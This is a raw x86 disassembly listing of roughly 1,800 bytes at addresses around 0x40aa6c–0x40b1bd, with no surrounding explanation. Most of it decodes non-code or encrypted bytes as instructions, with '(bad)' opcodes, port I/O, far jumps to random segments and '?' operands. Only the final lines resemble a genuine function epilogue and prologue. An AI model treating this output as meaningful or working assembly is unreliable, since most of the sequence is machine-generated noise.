  40aa6c:	ss add eax,0xf8e7c638
  40aa72:	ss sbb al,0x9b
  40aa75:	inc    ebp
  40aa76:	fs call edx
  40aa79:	pop    edx
  40aa7a:	stc    
  40aa7b:	cmp    DWORD PTR [esi+ebx*1+0x1b],0xffffff8c
  40aa80:	jnp    0x40aa51
  40aa82:	jbe    0x40aafe
  40aa84:	jge    0x40aae4
  40aa86:	jns    0x40aa2b
  40aa88:	or     BYTE PTR [edi+0x5e],0x70
  40aa8c:	and    DWORD PTR [esi],esp
  40aa8e:	xchg   esi,eax
  40aa8f:	mov    ch,0x17
  40aa91:	pop    edi
  40aa92:	out    dx,al
  40aa93:	xor    bl,BYTE PTR [eax+0x6f]
  40aa96:	mov    ebp,0x8a9750f5
  40aa9b:	in     eax,0xbb
  40aa9d:	jne    0x40aa74
  40aa9f:	pop    ds
  40aaa0:	mov    edi,0x1d4de0a3
  40aaa5:	mul    DWORD PTR [ecx-0x4c77ac05]
  40aaab:	cmc    
  40aaac:	fdecstp 
  40aaae:	mov    edx,ecx
  40aab0:	pop    esp
  40aab1:	(bad)  
  40aab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aab3:	outs   dx,DWORD PTR ds:[esi]
  40aab4:	or     ebp,ebx
  40aab6:	out    0xfb,al
  40aab8:	fwait
  40aab9:	jle    0x40ab09
  40aabb:	inc    ebp
  40aabc:	shl    dh,1
  40aabe:	push   ss
  40aabf:	add    ebx,DWORD PTR [ecx+edi*8]
  40aac2:	js     0x40aaae
  40aac4:	shr    DWORD PTR [eax],0x42
  40aac7:	test   DWORD PTR ds:[esi+0x2e],0x8705971e
  40aacf:	pop    edi
  40aad0:	dec    ecx
  40aad1:	jae    0x40aa9e
  40aad3:	xor    eax,0x9de91224
  40aad8:	nop
  40aad9:	or     al,BYTE PTR [edx]
  40aadb:	mov    eax,ds:0x912e2d08
  40aae0:	fsubr  DWORD PTR [edx+0x1a]
  40aae3:	fld    DWORD PTR [edx-0x5a424554]
  40aae9:	inc    esp
  40aaea:	outs   dx,DWORD PTR ds:[esi]
  40aaeb:	setge  BYTE PTR [ecx-0x7f]
  40aaef:	pushf  
  40aaf0:	out    0x35,al
  40aaf2:	repnz push eax
  40aaf4:	push   edi
  40aaf5:	(bad)  
  40aaf7:	fiadd  DWORD PTR [eax+0x58dedf1c]
  40aafd:	jb     0x40ab5d
  40aaff:	js     0x40ab75
  40ab01:	arpl   bp,di
  40ab03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab04:	mov    bl,0x8
  40ab06:	push   es
  40ab07:	stos   DWORD PTR es:[edi],eax
  40ab08:	xchg   edi,eax
  40ab09:	js     0x40ab48
  40ab0b:	adc    BYTE PTR [edi],ch
  40ab0d:	jo     0x40ab16
  40ab0f:	jne    0x40ab31
  40ab11:	pop    ebp
  40ab12:	scas   al,BYTE PTR es:[edi]
  40ab13:	mov    esi,0xd53b0030
  40ab18:	pop    ds
  40ab19:	sub    ah,BYTE PTR [ebp+0x2a]
  40ab1c:	push   cs
  40ab1d:	mov    bl,0x74
  40ab1f:	jmp    0x40aabf
  40ab21:	push   0x901d30ee
  40ab26:	fimul  DWORD PTR [edi]
  40ab28:	inc    ebx
  40ab29:	add    bl,ch
  40ab2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab2c:	adc    al,0x7f
  40ab2e:	pop    es
  40ab2f:	pop    eax
  40ab30:	and    DWORD PTR [ebp-0x21b88e2e],ebx
  40ab36:	lock fwait
  40ab38:	gs mov al,0x8c
  40ab3b:	outs   dx,BYTE PTR ds:[esi]
  40ab3c:	mov    eax,ds:0xc13add81
  40ab41:	repnz leave 
  40ab43:	(bad)  
  40ab44:	call   0xfc9413bc
  40ab49:	dec    ecx
  40ab4a:	push   ss
  40ab4b:	mov    WORD PTR [ecx],fs
  40ab4d:	ins    BYTE PTR es:[edi],dx
  40ab4e:	and    al,0x33
  40ab50:	mov    ds:0x10c1bafb,al
  40ab55:	push   ss
  40ab56:	std    
  40ab57:	xchg   edi,eax
  40ab58:	push   eax
  40ab59:	rcl    DWORD PTR [esi],0x82
  40ab5c:	push   es
  40ab5d:	movaps xmm5,XMMWORD PTR [ebx-0x76]
  40ab61:	mov    bh,0xe3
  40ab63:	(bad)  
  40ab64:	or     BYTE PTR [ecx+ecx*4+0x35],ah
  40ab68:	push   cs
  40ab69:	sbb    al,dl
  40ab6b:	adc    al,bl
  40ab6d:	imul   eax,DWORD PTR [ebx-0x27],0xb
  40ab71:	stos   BYTE PTR es:[edi],al
  40ab72:	jg     0x40abce
  40ab74:	gs fwait
  40ab76:	mov    ch,0x39
  40ab78:	jns    0x40abba
  40ab7a:	mov    ds:0x16d1fe03,eax
  40ab7f:	xor    al,0x2c
  40ab81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab82:	or     DWORD PTR ds:0x882d739d,0xffffffc0
  40ab89:	push   edx
  40ab8a:	aam    0x23
  40ab8c:	pop    esi
  40ab8d:	pop    ebp
  40ab8e:	push   ebx
  40ab8f:	dec    edi
  40ab90:	mov    dl,bh
  40ab92:	sbb    ebp,DWORD PTR [ebp+0x128a36e2]
  40ab98:	sub    cl,al
  40ab9a:	mov    cl,0x7d
  40ab9c:	push   eax
  40ab9d:	mov    ch,0x80
  40ab9f:	xlat   BYTE PTR ds:[ebx]
  40aba0:	pop    edx
  40aba1:	in     al,0x34
  40aba3:	adc    BYTE PTR [ebp+0x7c],ch
  40aba6:	call   0x516:0x654600d7
  40abad:	popa   
  40abae:	and    DWORD PTR [eax+0x7f0ac30d],edx
  40abb4:	fldcw  WORD PTR [esi]
  40abb6:	adc    al,0xa5
  40abb8:	sub    eax,0xdc654657
  40abbd:	js     0x40aba8
  40abbf:	iret   
  40abc0:	shl    DWORD PTR [ecx+ebp*4+0x5a],0xdc
  40abc5:	xor    edx,edx
  40abc7:	mov    ebp,0xe2a9bb46
  40abcc:	mov    edi,ebp
  40abce:	sbb    DWORD PTR [ebp+0x7f],edx
  40abd1:	arpl   WORD PTR [ebx],si
  40abd3:	je     0x40ab61
  40abd5:	mov    esp,0xf85ef3a4
  40abda:	in     eax,dx
  40abdb:	adc    DWORD PTR [edx],ebx
  40abdd:	add    BYTE PTR [ebx-0x69],cl
  40abe0:	lods   eax,DWORD PTR ds:[esi]
  40abe1:	or     BYTE PTR [ecx],cl
  40abe3:	aam    0xca
  40abe5:	jge    0x40abd0
  40abe7:	in     eax,dx
  40abe8:	dec    ebx
  40abe9:	out    dx,eax
  40abea:	add    al,BYTE PTR [edi]
  40abec:	mov    dl,BYTE PTR [edx+edi*4+0x22]
  40abf0:	cmc    
  40abf1:	scas   eax,DWORD PTR es:[edi]
  40abf2:	add    DWORD PTR [esi+0x74],esp
  40abf5:	jecxz  0x40ac4c
  40abf7:	push   ecx
  40abf8:	sub    al,0x97
  40abfa:	mov    bh,0x81
  40abfc:	mov    ah,0xa7
  40abfe:	push   esp
  40abff:	xor    eax,0x8a3d3bdf
  40ac04:	and    BYTE PTR [ecx-0x20719c0c],ah
  40ac0a:	mov    al,BYTE PTR [ebx]
  40ac0c:	dec    ebp
  40ac0d:	mov    al,0x71
  40ac0f:	ret    0xbeba
  40ac12:	adc    dh,BYTE PTR [edx-0x2b]
  40ac15:	and    esp,DWORD PTR [esi]
  40ac17:	add    al,0x1c
  40ac19:	push   ds
  40ac1a:	imul   esp,DWORD PTR [edi+0x7],0x5d
  40ac1e:	mov    ds:0x920ff419,al
  40ac23:	(bad)  
  40ac24:	repz mov bl,0x5c
  40ac27:	mov    bh,0x69
  40ac29:	pusha  
  40ac2a:	push   ebx
  40ac2b:	lds    eax,FWORD PTR [ebx-0x10]
  40ac2e:	out    0x67,al
  40ac30:	cmp    BYTE PTR [edi],cl
  40ac32:	rcl    DWORD PTR ss:[edx+0x72487f08],1
  40ac39:	inc    edx
  40ac3a:	push   esi
  40ac3b:	dec    edx
  40ac3c:	xchg   DWORD PTR [ebp+0x63],ecx
  40ac3f:	std    
  40ac40:	and    BYTE PTR [ebx],cl
  40ac42:	in     eax,0xd8
  40ac44:	xor    ecx,DWORD PTR [ebp+0x30264d0a]
  40ac4a:	sub    al,0xf7
  40ac4c:	mov    dl,0x65
  40ac4e:	mov    ebx,0x92d56a9e
  40ac53:	inc    DWORD PTR [eax+0x66b3cce2]
  40ac59:	sub    ch,BYTE PTR [ebp-0x42]
  40ac5c:	sahf   
  40ac5d:	and    BYTE PTR [edx+eiz*2-0x6a815bc3],dl
  40ac64:	cmc    
  40ac65:	mov    ebx,0xbdda43c2
  40ac6a:	adc    eax,0x8290d7ab
  40ac6f:	mov    ds:0x1e7538ee,eax
  40ac74:	sub    bl,BYTE PTR [esi+eiz*2]
  40ac77:	cmp    ecx,DWORD PTR [ebx-0x2142d2eb]
  40ac7d:	std    
  40ac7e:	xor    eax,0x85b8ac27
  40ac83:	lock (bad) 
  40ac85:	mov    ds:0xd69e41e6,eax
  40ac8a:	inc    esi
  40ac8b:	mov    eax,ds:0x2e7fc87c
  40ac90:	scas   eax,DWORD PTR es:[edi]
  40ac91:	aas    
  40ac92:	mov    WORD PTR [ebx],?
  40ac94:	add    BYTE PTR [edi+0x76],cl
  40ac97:	or     eax,0x4359453b
  40ac9c:	pusha  
  40ac9d:	dec    eax
  40ac9e:	ds stos BYTE PTR es:[edi],al
  40aca0:	dec    ebx
  40aca1:	sti    
  40aca2:	icebp  
  40aca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aca4:	dec    edi
  40aca5:	xor    eax,0x2a0a7a51
  40acaa:	call   0xadd7abbe
  40acaf:	popf   
  40acb0:	mov    ebp,0x56db096c
  40acb5:	imul   esi,DWORD PTR [eax],0x807c9466
  40acbb:	retf   
  40acbc:	int    0x92
  40acbe:	mov    ebx,edi
  40acc0:	jl     0x40ac64
  40acc2:	sub    eax,0x13a4197e
  40acc7:	imul   ecx,DWORD PTR [eax+0x3e96a236],0x4424081a
  40acd1:	adc    dh,BYTE PTR [edx-0x7c741f42]
  40acd7:	dec    edi
  40acd8:	fwait
  40acd9:	inc    esp
  40acda:	(bad)  
  40acdb:	jmp    0x8a68:0x23c9f51a
  40ace2:	pushf  
  40ace3:	sbb    DWORD PTR [ebx+0x3b0e4b61],eax
  40ace9:	addr16 aas 
  40aceb:	push   eax
  40acec:	out    0xc8,al
  40acee:	outs   dx,BYTE PTR ds:[esi]
  40acef:	ins    BYTE PTR es:[edi],dx
  40acf0:	adc    edx,ecx
  40acf2:	mov    ds:0xc3bd20d8,al
  40acf7:	rcl    BYTE PTR [ebp+0x15],0xc5
  40acfb:	daa    
  40acfc:	test   BYTE PTR [ebp+0x35],ah
  40acff:	in     eax,dx
  40ad00:	fsub   DWORD PTR [ebp+0x6cae25d7]
  40ad06:	xchg   ebx,eax
  40ad07:	push   edi
  40ad08:	stos   BYTE PTR es:[edi],al
  40ad09:	jbe    0x40ad46
  40ad0b:	aaa    
  40ad0c:	aas    
  40ad0d:	dec    eax
  40ad0e:	vmovsldup xmm4,XMMWORD PTR [ebx-0x225aa13b]
  40ad16:	mov    ?,WORD PTR [ecx+0x52]
  40ad19:	test   eax,0x958ad981
  40ad1e:	inc    esi
  40ad1f:	sbb    eax,0x38180118
  40ad24:	or     DWORD PTR [edi],edi
  40ad26:	hlt    
  40ad27:	es fdiv st,st(0)
  40ad2a:	pop    ebx
  40ad2b:	adc    DWORD PTR [ebx],esp
  40ad2d:	enter  0x3a12,0x56
  40ad31:	pop    es
  40ad32:	adc    DWORD PTR [ecx-0x39e28ad5],esp
  40ad38:	inc    esi
  40ad39:	xchg   ebp,eax
  40ad3a:	adc    eax,0x67f294a0
  40ad3f:	add    BYTE PTR [esi],bl
  40ad41:	out    0x25,al
  40ad43:	dec    esp
  40ad44:	pop    ebp
  40ad45:	mov    DWORD PTR [ebp+edx*8-0x8],eax
  40ad49:	aas    
  40ad4a:	xor    eax,0x37a65e39
  40ad4f:	cmp    BYTE PTR [ebp+0x42],ah
  40ad52:	push   0xcf3a058e
  40ad57:	mov    esi,0xb7e55a71
  40ad5c:	cmp    BYTE PTR ds:0x699a97d5,bl
  40ad62:	push   esp
  40ad63:	scas   eax,DWORD PTR es:[edi]
  40ad64:	jl     0x40adcc
  40ad66:	(bad)  
  40ad67:	pop    ecx
  40ad68:	inc    esi
  40ad69:	outs   dx,BYTE PTR ds:[esi]
  40ad6a:	mov    dl,0x67
  40ad6c:	sar    cl,0x7d
  40ad6f:	xchg   BYTE PTR ds:0x39365c08,ch
  40ad75:	jg     0x40ad22
  40ad77:	jmp    0x9f42:0x6b06d015
  40ad7e:	mov    ds,WORD PTR [ecx+ecx*2+0x4d]
  40ad82:	pop    esi
  40ad83:	cmp    bl,BYTE PTR [edx]
  40ad85:	in     eax,dx
  40ad86:	scas   al,BYTE PTR es:[edi]
  40ad87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad88:	retf   0x3a59
  40ad8b:	test   BYTE PTR [ebp+0x55],0x86
  40ad8f:	adc    ch,al
  40ad91:	mov    edx,0x95d7f062
  40ad96:	addr16 and al,0x5f
  40ad99:	clc    
  40ad9a:	dec    edi
  40ad9b:	repnz xchg ecx,eax
  40ad9d:	jo     0x40adba
  40ad9f:	add    BYTE PTR [edi],al
  40ada1:	(bad)  
  40ada2:	test   BYTE PTR [ebp-0x46],ah
  40ada5:	sbb    DWORD PTR [edx],ebx
  40ada7:	push   esi
  40ada8:	fisubr WORD PTR [edi+esi*1]
  40adab:	sti    
  40adac:	rcl    BYTE PTR [esi-0x66],0x8e
  40adb0:	jne    0x40ad80
  40adb2:	imul   cl
  40adb4:	ficom  WORD PTR [ebp-0x3e261de7]
  40adba:	ror    ch,cl
  40adbc:	icebp  
  40adbd:	leave  
  40adbe:	pop    ecx
  40adbf:	mov    bh,bh
  40adc1:	aaa    
  40adc2:	int    0x9f
  40adc4:	pop    edi
  40adc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adc6:	mov    edi,ecx
  40adc8:	cli    
  40adc9:	pop    ecx
  40adca:	(bad)  
  40adcb:	push   eax
  40adcc:	(bad)  [ebp+0x69]
  40adcf:	jg     0x40adba
  40add1:	pop    ebx
  40add2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40add3:	pop    ss
  40add4:	mov    al,ds:0xd5ca2835
  40add9:	xchg   ebp,eax
  40adda:	cli    
  40addb:	mov    bl,0x5c
  40addd:	push   ds
  40adde:	pop    esi
  40addf:	push   eax
  40ade0:	pop    edi
  40ade1:	or     ecx,DWORD PTR [edi-0x26]
  40ade4:	xchg   ecx,eax
  40ade5:	in     al,0x47
  40ade7:	jae    0x40ad95
  40ade9:	or     eax,0xaa4fc92f
  40adee:	or     eax,0xd0cbe67
  40adf3:	mov    BYTE PTR [ecx-0x10bfa71f],dh
  40adf9:	(bad)  
  40adfa:	iret   
  40adfb:	dec    edi
  40adfc:	fwait
  40adfd:	lods   eax,DWORD PTR ds:[esi]
  40adfe:	mov    ch,0xc7
  40ae00:	(bad)  
  40ae01:	adc    al,0x95
  40ae03:	inc    esp
  40ae04:	cwde   
  40ae05:	out    dx,al
  40ae06:	dec    edx
  40ae07:	mov    ds:0x17d96c98,al
  40ae0c:	sbb    al,0x55
  40ae0e:	sub    eax,eax
  40ae10:	jl     0x40add6
  40ae12:	pop    edx
  40ae13:	pushf  
  40ae14:	jne    0x40ad99
  40ae16:	ins    BYTE PTR es:[edi],dx
  40ae17:	jecxz  0x40ae95
  40ae19:	fwait
  40ae1a:	je     0x40ae61
  40ae1c:	jle    0x40ade7
  40ae1e:	retf   
  40ae1f:	mov    edi,0xf6f9e82a
  40ae24:	xlat   BYTE PTR ds:[ebx]
  40ae25:	push   ebx
  40ae26:	mov    ch,0xcd
  40ae28:	inc    DWORD PTR [edi]
  40ae2a:	pop    edx
  40ae2b:	(bad)  
  40ae2c:	(bad)  
  40ae2d:	test   al,0xab
  40ae2f:	or     al,0x7c
  40ae31:	xor    BYTE PTR [edi],0x8a
  40ae34:	mov    al,ds:0x5db4edfa
  40ae39:	out    0x5d,al
  40ae3b:	arpl   WORD PTR [ecx+0x6d308dc0],ax
  40ae41:	scas   al,BYTE PTR es:[edi]
  40ae42:	sub    cl,BYTE PTR [eax-0x4e26eff0]
  40ae48:	sahf   
  40ae49:	shl    BYTE PTR [ebx-0x2f],1
  40ae4c:	mov    cs:0x3297a599,eax
  40ae52:	push   ebx
  40ae53:	jns    0x40ade6
  40ae55:	jbe    0x40ae19
  40ae57:	cwde   
  40ae58:	(bad)  
  40ae59:	loop   0x40ae72
  40ae5b:	jmp    0x40ae91
  40ae5d:	xor    edi,edx
  40ae5f:	jl     0x40ae2a
  40ae61:	mov    edx,0xe15d7456
  40ae66:	or     DWORD PTR [esi],edi
  40ae68:	dec    edi
  40ae69:	pop    edx
  40ae6a:	enter  0x1599,0x3d
  40ae6e:	add    DWORD PTR [ecx+edx*8-0x48],ebp
  40ae72:	xor    eax,0xafd6de76
  40ae77:	jno    0x40ae98
  40ae79:	mov    ds:0x82a053d3,eax
  40ae7e:	inc    edi
  40ae7f:	cmc    
  40ae80:	(bad)  
  40ae81:	mov    ebx,0x9dd7a093
  40ae86:	push   ss
  40ae87:	mov    ah,0xbe
  40ae89:	push   ss
  40ae8a:	(bad)  [edx-0x60116e96]
  40ae90:	jmp    0xb363e1a3
  40ae95:	(bad)  
  40ae97:	mov    al,ds:0x3bfc6608
  40ae9c:	inc    ebx
  40ae9d:	test   DWORD PTR [ebx],ebx
  40ae9f:	cld    
  40aea0:	adc    al,0x4a
  40aea2:	and    BYTE PTR [esi-0x3325151],bl
  40aea8:	mov    cl,0x6d
  40aeaa:	scas   al,BYTE PTR es:[edi]
  40aeab:	je     0x40ae5f
  40aead:	pusha  
  40aeae:	mov    eax,0x79902106
  40aeb3:	in     al,dx
  40aeb4:	call   0x22eb:0xdbf2abb
  40aebb:	mov    ds:0x63969906,eax
  40aec0:	mov    ebp,0xb34dfbe8
  40aec5:	iret   
  40aec6:	in     al,0xef
  40aec8:	clc    
  40aec9:	stos   BYTE PTR es:[edi],al
  40aeca:	inc    ecx
  40aecb:	and    al,0x42
  40aecd:	adc    edi,DWORD PTR [ebp+0x8c22092]
  40aed3:	jbe    0x40ae65
  40aed5:	(bad)  
  40aed6:	loopne 0x40ae96
  40aed8:	(bad)  
  40aedb:	push   esp
  40aedc:	pop    eax
  40aedd:	push   ecx
  40aede:	mov    al,ds:0x3d3f939e
  40aee3:	jae    0x40af25
  40aee5:	xchg   esi,eax
  40aee6:	rcr    BYTE PTR ds:[edx+0x9],0x25
  40aeeb:	daa    
  40aeec:	dec    edx
  40aeed:	xchg   DWORD PTR ds:0xcebf1c11,ecx
  40aef3:	in     al,0xd5
  40aef5:	push   ecx
  40aef6:	jo     0x40aecc
  40aef8:	retf   0xf8cd
  40aefb:	mov    al,BYTE PTR [ecx-0x5f110d4b]
  40af01:	jbe    0x40af54
  40af03:	jo     0x40ae9a
  40af05:	and    edi,DWORD PTR [ebx]
  40af07:	push   ecx
  40af08:	cld    
  40af09:	jno    0x40aea6
  40af0b:	inc    ecx
  40af0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af0d:	mov    ebp,0xa7a640bd
  40af12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af13:	jp     0x40af34
  40af15:	data16 xor al,0x15
  40af18:	push   ds
  40af19:	pusha  
  40af1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af1b:	fdiv   QWORD PTR [edi]
  40af1d:	addr16 sahf 
  40af1f:	push   0x2c0d03e
  40af24:	fdivrp st(0),st
  40af26:	add    ebp,ecx
  40af28:	gs sbb dh,dl
  40af2b:	and    BYTE PTR [edx+0x74cde35b],bl
  40af31:	shl    DWORD PTR [ecx+0x2620061],0x9d
  40af38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af39:	jge    0x40af48
  40af3b:	add    esi,DWORD PTR [esi-0x7f]
  40af3e:	dec    ebx
  40af3f:	pop    edi
  40af40:	(bad)  
  40af42:	and    eax,0x6cfde00b
  40af47:	jo     0x40af1d
  40af49:	sti    
  40af4a:	dec    ebx
  40af4b:	out    0x28,al
  40af4d:	popf   
  40af4e:	xor    ecx,esi
  40af50:	cmc    
  40af51:	add    al,0x98
  40af53:	test   al,0x52
  40af55:	mov    edx,esp
  40af57:	outs   dx,DWORD PTR ds:[esi]
  40af58:	or     al,0xad
  40af5a:	adc    BYTE PTR [ebx],dl
  40af5c:	push   esi
  40af5d:	xor    ebx,DWORD PTR ds:0x1f5c71b5
  40af63:	pop    ss
  40af64:	ja     0x40af12
  40af66:	or     BYTE PTR [edx],ch
  40af68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af69:	dec    eax
  40af6a:	mov    ebx,0x9292f71b
  40af6f:	mov    esp,DWORD PTR [edx+esi*1-0x5d]
  40af73:	pop    esi
  40af74:	cli    
  40af75:	retf   0x29bf
  40af78:	pop    es
  40af79:	xor    esp,eax
  40af7b:	push   eax
  40af7c:	fs loop 0x40afed
  40af7f:	pop    ebp
  40af80:	ficomp WORD PTR [esi+eax*1+0x4c]
  40af84:	lahf   
  40af85:	jne    0x40af8e
  40af87:	mov    cl,0x0
  40af89:	ret    0x68cf
  40af8c:	mov    al,0x48
  40af8e:	retf   
  40af8f:	mov    al,0x4f
  40af91:	push   ebp
  40af92:	and    BYTE PTR [ebp+ebx*1+0x4cc2dc50],0xa5
  40af9a:	shl    DWORD PTR [ecx],1
  40af9c:	ss shr ch,1
  40af9f:	add    dl,BYTE PTR [esi]
  40afa1:	test   eax,0x316bf201
  40afa6:	xchg   edx,eax
  40afa7:	stos   BYTE PTR es:[edi],al
  40afa8:	adc    eax,0x740a6e61
  40afad:	jle    0x40afbd
  40afaf:	push   ebp
  40afb0:	cmp    eax,0xa6df4e0c
  40afb5:	repz or BYTE PTR [ebp-0x57],al
  40afb9:	mov    eax,0x79fff73f
  40afbe:	(bad)  
  40afbf:	cmp    BYTE PTR [esi],al
  40afc1:	aam    0xd0
  40afc3:	dec    eax
  40afc4:	sub    al,0x94
  40afc6:	push   es
  40afc7:	lahf   
  40afc8:	out    dx,eax
  40afc9:	add    DWORD PTR [edx-0x4eeb566d],eax
  40afcf:	jle    0x40afcf
  40afd1:	mov    ds:0xae6e8637,al
  40afd6:	cmp    ebx,DWORD PTR [ecx+0x56]
  40afd9:	inc    esi
  40afda:	adc    eax,ebp
  40afdc:	fmul   DWORD PTR [edi-0x3c]
  40afdf:	(bad)  
  40afe0:	fild   WORD PTR [edx-0x249b6398]
  40afe6:	fidivr WORD PTR [ebx-0x59]
  40afe9:	shl    ebx,1
  40afeb:	shr    edx,cl
  40afed:	mov    ebp,0xa0bb31b0
  40aff2:	inc    esp
  40aff3:	mov    dh,0xc
  40aff5:	test   BYTE PTR [ebx+0x418996ac],0x11
  40affc:	mov    al,0x5a
  40affe:	xor    DWORD PTR [edx+0x5d],0x5cc741d3
  40b005:	call   0x96ded4f2
  40b00a:	dec    edi
  40b00b:	add    DWORD PTR [edi+edx*1-0x68],0x42d743e5
  40b013:	xor    edi,DWORD PTR [ebx-0x2e1fd5d7]
  40b019:	bound  edx,QWORD PTR [ecx-0x68ebb741]
  40b01f:	inc    ebx
  40b020:	ins    DWORD PTR es:[edi],dx
  40b021:	add    al,0x52
  40b023:	dec    ebx
  40b024:	sbb    DWORD PTR [ebx],esp
  40b026:	pop    ss
  40b027:	and    eax,0x3d6604f
  40b02c:	shl    DWORD PTR [esi-0x207e30c5],0x8f
  40b033:	push   cs
  40b034:	aad    0xc9
  40b036:	cdq    
  40b037:	and    al,0x3b
  40b039:	inc    esp
  40b03a:	in     al,dx
  40b03b:	jno    0x40aff3
  40b03d:	or     ebx,eax
  40b03f:	or     cl,cl
  40b041:	aam    0x4b
  40b043:	lahf   
  40b044:	mov    ecx,0xa6b7c4a5
  40b049:	push   esp
  40b04a:	shr    esi,cl
  40b04c:	add    al,0x89
  40b04e:	ja     0x40b044
  40b050:	ds jecxz 0x40afd6
  40b053:	les    ebp,FWORD PTR [eax+0x42]
  40b056:	sbb    al,0xe9
  40b058:	int    0x17
  40b05a:	mov    al,al
  40b05c:	les    ecx,FWORD PTR [edi+eax*1-0x67]
  40b060:	cld    
  40b061:	add    eax,0x692cf631
  40b066:	cmp    BYTE PTR [esi-0x4e],0x7c
  40b06a:	mov    al,ds:0xf32578d4
  40b06f:	dec    esi
  40b070:	pop    ecx
  40b071:	pop    ebx
  40b072:	inc    eax
  40b073:	ret    0xf851
  40b076:	sbb    cl,BYTE PTR [esi]
  40b078:	or     ebp,DWORD PTR [ecx-0x470b7d27]
  40b07e:	sub    dl,BYTE PTR [eax]
  40b080:	add    al,0x81
  40b082:	add    bh,BYTE PTR [eax+0x61565d36]
  40b088:	sahf   
  40b089:	dec    si
  40b08b:	jo     0x40b06c
  40b08d:	dec    BYTE PTR [esi]
  40b08f:	dec    ecx
  40b090:	retf   
  40b091:	xrelease xchg DWORD PTR [eax+0x4f],esp
  40b095:	out    0x55,eax
  40b097:	sar    BYTE PTR [ebp-0x19edc3b2],0xa3
  40b09e:	push   es
  40b09f:	leave  
  40b0a0:	out    0x40,eax
  40b0a2:	jne    0x40b0a8
  40b0a4:	hlt    
  40b0a5:	dec    edi
  40b0a6:	pop    ss
  40b0a7:	jae    0x40b065
  40b0a9:	pop    ebp
  40b0aa:	or     bh,BYTE PTR [ebx+0x55a6d3d2]
  40b0b0:	sub    cl,BYTE PTR [edx-0x46745dc3]
  40b0b6:	pop    ebp
  40b0b7:	and    al,0xe7
  40b0b9:	mov    ecx,0x27b3b77
  40b0be:	iret   
  40b0bf:	lds    eax,FWORD PTR [ebx+0x54688a4c]
  40b0c5:	jmp    0x2a35:0xcb05ae23
  40b0cc:	dec    eax
  40b0cd:	cld    
  40b0ce:	add    edx,edi
  40b0d0:	out    dx,al
  40b0d1:	fs repz xor al,0x3
  40b0d5:	mov    ebx,0xadd285e3
  40b0da:	inc    ecx
  40b0db:	sbb    eax,0x9b6697da
  40b0e0:	call   DWORD PTR [eax+0x33]
  40b0e3:	fmul   st(4),st
  40b0e5:	dec    ebx
  40b0e6:	popa   
  40b0e7:	cld    
  40b0e8:	stc    
  40b0e9:	push   ecx
  40b0ea:	ins    DWORD PTR es:[edi],dx
  40b0eb:	call   0x564e4647
  40b0f0:	jmp    0x7edf:0x54c476fc
  40b0f7:	xchg   ecx,eax
  40b0f8:	mov    esp,0xbd1ad95b
  40b0fd:	xor    bl,BYTE PTR [ebx]
  40b0ff:	mov    ch,0xf4
  40b101:	ss adc al,0x9b
  40b104:	xor    eax,0x9ccf1c13
  40b109:	(bad)  
  40b10a:	sub    eax,DWORD PTR [ebp-0x30e8c66b]
  40b110:	mov    dl,0xaa
  40b112:	xchg   edi,eax
  40b113:	mov    cl,0x2a
  40b115:	sahf   
  40b116:	aaa    
  40b117:	pop    ds
  40b118:	cmp    al,0xab
  40b11a:	or     eax,0x93f820c6
  40b11f:	jmp    0x40b185
  40b121:	(bad)  
  40b122:	bound  edi,QWORD PTR [ebx]
  40b124:	pop    ss
  40b125:	push   0xec71ed46
  40b12a:	or     BYTE PTR [eax+0xb6e8f8c],dh
  40b130:	sbb    al,0xc2
  40b132:	mov    cl,0xe0
  40b134:	sbb    dh,BYTE PTR [ebx-0xd]
  40b137:	pop    ebp
  40b138:	and    dh,0xfa
  40b13b:	push   es
  40b13c:	xchg   esp,eax
  40b13d:	cs loopne 0x40b163
  40b140:	push   ebx
  40b141:	mov    edx,0x13c06e0
  40b146:	cld    
  40b147:	inc    esi
  40b148:	inc    edx
  40b149:	xchg   esp,eax
  40b14a:	out    0x9a,al
  40b14c:	mov    esi,?
  40b14e:	push   cs
  40b14f:	cmc    
  40b150:	hlt    
  40b151:	xor    DWORD PTR [eax-0x80],ebp
  40b154:	lds    ecx,FWORD PTR [edi+0x20f3e023]
  40b15a:	fstp   DWORD PTR ds:0x168176cd
  40b160:	sbb    DWORD PTR [edx-0x14b773e8],esi
  40b166:	inc    ebp
  40b167:	or     eax,0x837f48ce
  40b16c:	and    eax,0x68411201
  40b171:	xor    esi,DWORD PTR ds:0x37961388
  40b177:	add    edi,DWORD PTR [edx-0x15]
  40b17a:	xor    BYTE PTR [edi-0x3d],cl
  40b17d:	cmp    ebp,edi
  40b17f:	adc    esp,ecx
  40b181:	pop    es
  40b182:	sbb    BYTE PTR [edx+edi*8+0x2b],cl
  40b186:	pusha  
  40b187:	adc    al,0x9e
  40b189:	push   ds
  40b18a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b18b:	push   ecx
  40b18c:	pop    ecx
  40b18d:	test   DWORD PTR [ecx-0x1f],ebx
  40b190:	aas    
  40b191:	fsubr  QWORD PTR [eax]
  40b193:	jg     0x40b1ad
  40b195:	pop    ss
  40b196:	inc    esi
  40b197:	mov    eax,DWORD PTR [ebp+0x18]
  40b19a:	mov    esi,DWORD PTR [ebp+0x10]
  40b19d:	mov    DWORD PTR [esi+0xc],eax
  40b1a0:	mov    eax,DWORD PTR [ebp+0x1c]
  40b1a3:	mov    esi,DWORD PTR [ebp+0x10]
  40b1a6:	mov    DWORD PTR [esi+0x10],eax
  40b1a9:	mov    eax,DWORD PTR [ebp+0x8]
  40b1ac:	xor    eax,ecx
  40b1ae:	add    eax,edx
  40b1b0:	pop    esi
  40b1b1:	leave  
  40b1b2:	ret    0x18
  40b1b5:	push   ebp
  40b1b6:	mov    ebp,esp
  40b1b8:	mov    eax,ds:0x41d3dc
  40b1bd:	sub    ecx,DWORD PTR ds:0x428010
